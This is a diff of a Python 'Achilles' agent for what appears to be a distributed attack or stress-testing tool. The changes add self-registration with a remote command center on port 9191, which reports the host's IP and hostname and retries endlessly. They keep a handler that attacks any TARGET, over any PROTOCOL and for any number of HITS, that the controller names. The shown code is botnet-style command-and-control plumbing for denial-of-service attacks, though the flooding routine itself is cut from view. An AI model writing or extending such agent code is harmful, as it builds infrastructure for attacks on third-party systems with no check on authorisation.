@@ -6,67 +6,85 @@ from threading import Thread
 
 class AgentInstance:
 
-    def __init__(self, LOCAL_IP, PORT=8574):
+    def __init__(self, LOCAL_IP, PORT=8574, COMMAND_CENTER=None):
         # Default required Variables (CONSTANTS)
         self.HOST = socket.gethostname()
         self.PORT = PORT
         self.LOCAL_IP = LOCAL_IP
-
-        print("Agent started on: ", self.LOCAL_IP)
+        self.UNREGISTERED = True
+        print("Achilles Agent Version 0.9.1")
 
         # Variables
-        self.COMMAND_CENTER = None
+        self.COMMAND_CENTER = COMMAND_CENTER
         self.should_heartbeat = False
 
         # Thread(s)
         self.heartbeat_thread = Thread(target=self.send_heartbeat)
+
+    def register_agent(self):
+            
+         # Register the agent
+            try:
+                print(f"\033[1;33mRegistering at Command Center: \033[1;32m{self.COMMAND_CENTER}")
+                DATA = json.dumps({"REGISTRATION": {"AGENT_IP": f"{self.LOCAL_IP}", "HOSTNAME": f"{self.HOST}"}})
+                # Send the registration data to the command center
+                socket.create_connection((self.COMMAND_CENTER, 9191)).sendall(DATA.encode())
+                self.UNREGISTERED = False
+                print("\033[1;32mRegistration completed. Happy testing!")
+            except Exception as e:
+                print("\033[1;31mERROR could contact Command Center: ", e)
+                print("Retrying in 5 seconds..")
+                time.sleep(5)
+                self.register_agent()
+
 
     def listen(self, MAX_CONNECTIONS=1):
         # Bind the socket to port -> SOCK_STREAM = tcp traffic
         sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         # Bind the sockets to the machine ip and 8574 port
         sock.bind((self.LOCAL_IP, self.PORT))
-        # Start listening on host and port, accepting a maximal of 50 connections in queue. New requests get denied.
+        # Start listening on host and port
         sock.listen(MAX_CONNECTIONS)
 
         while True:
             # Using ASCII colors here for readability  \033[#m] is the escape format, the number is the color Yellow = 33 Green=32
             print(
-                f"Machine started listening on: \n\033[1;33mIP: \033[1;32m {self.LOCAL_IP}  \n\033[1;33mHostname: \033[1;32m{self.HOST.upper()}  \n\033[1;33mPort: \033[1;32m{self.PORT}")
-            if self.COMMAND_CENTER:
-                print(f"\033[1;33mCommand Center connected from: \033[1;32m{self.COMMAND_CENTER}")
-            else:
-                print("\033[1;31mCommand Center not registered yet, please do so before continueing")
+                f"\n\033[1;33mAGENT IP: \033[1;32m {self.LOCAL_IP}  \n\033[1;33mHOSTNAME: \033[1;32m{self.HOST.upper()}  \n\033[1;33mPORT: \033[1;32m{self.PORT}")
+            print("\033[1;31mCommand Center did not acknowledge the registaion yet.. Waiting for registration..")
+            
+            # Register the agent
+            self.register_agent()
+
+            # Accept incoming connections
             connection, addr = sock.accept()
 
             # Decode command center's JSON data and assign to variable
             data = connection.recv(1024).decode()
             data = json.loads(data)
 
-            # Attack based on fed data, then break subloop upon completion
             try:
                 while True:
                     if data:
 
-                        # Register the command centrum
-                        if data['GOAL'] == "REGISTER":
-                            try:
-                                # Retrieve the command center IP from the message
-                                self.COMMAND_CENTER = data["COMMAND_CENTER_IP"]
-                                print(
-                                    f"\n\033[1;95mCommand Center registration complete @: \033[1;32m{self.COMMAND_CENTER}")
-                                # Stop any active heartbeats in case of re-registering
-                                self.should_heartbeat = False
-                                # Start heartbeats on a seperate thread to not clog the main loop
-                                self.should_heartbeat = True
-                                self.heartbeat_thread.start()
+                        # # Register the command centrum
+                        # if data['GOAL'] == "REGISTER":
+                        #     try:
+                        #         # Retrieve the command center IP from the message
+                        #         self.COMMAND_CENTER = data["COMMAND_CENTER_IP"]
+                        #         print(
+                        #             f"\n\033[1;95mCommand Center registration complete @: \033[1;32m{self.COMMAND_CENTER}")
+                        #         # Stop any active heartbeats in case of re-registering
+                        #         self.should_heartbeat = False
+                        #         # Start heartbeats on a seperate thread to not clog the main loop
+                        #         self.should_heartbeat = True
+                        #         self.heartbeat_thread.start()
 
-                            except Exception as e:
-                                print("Command center could not register: ", e)
-                            break
+                        #     except Exception as e:
+                        #         print("Command center could not register: ", e)
+                        #     break
 
                         # Attack the target
-                        elif data['GOAL'] == "ATTACK" and self.COMMAND_CENTER:
+                        if data['GOAL'] == "ATTACK" and self.COMMAND_CENTER:
                             print(
                                 f"\033[1;95mDebug: Instructed to attack '{data['TARGET'].upper()}' on protocol: '{data['PROTOCOL'].upper()}' * '{data['HITS']}' times")
 
@@ -155,7 +173,7 @@ class AgentInstance:
                 # Send data to Command Center to confirm successful registration, add the IP of the agent for database registration
                 success_message = json.dumps({"REGISTRATION": {"AGENT_IP": f"{self.LOCAL_IP}", "HOSTNAME": f"{self.HOST}"}})
                 # Connect to the command center and send the success message to confirm registration
-                s.connect(("192.168.1.88", 9191))
+                s.connect((self.COMMAND_CENTER, 9191))
                 s.sendall(success_message.encode())
                 # close the connection
                 s.close()
